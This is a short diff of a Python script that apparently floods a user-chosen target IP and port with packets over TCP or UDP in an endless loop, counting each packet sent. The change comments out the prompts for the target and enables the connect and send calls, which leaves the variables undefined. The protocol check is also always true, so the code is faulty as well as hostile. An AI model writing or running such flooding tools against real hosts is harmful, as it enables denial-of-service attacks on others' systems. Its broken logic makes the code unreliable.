@@ -64,8 +64,8 @@ elif protocol == "udp" or "UDP":
   s = socket(AF_INET, SOCK_DGRAM)
 
 os.system("clear")
-ip = input("Target IP: ")
-port = input("Port: ")
+#ip = input("Target IP: ")
+#port = input("Port: ")
 #sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
 #os.system ("clear")
 
@@ -75,7 +75,8 @@ port = input("Port: ")
 while True:
   #ifndto(bytes, (ip, int(port)))
   #s.connect((ip, int(port)))
-  #s.send(bytes)
+  s.connect((ip, port))
+  s.send(bytes)
   pocket = pocket + 1
   print(f"pocket{pocket}")
   time.sleep(2)
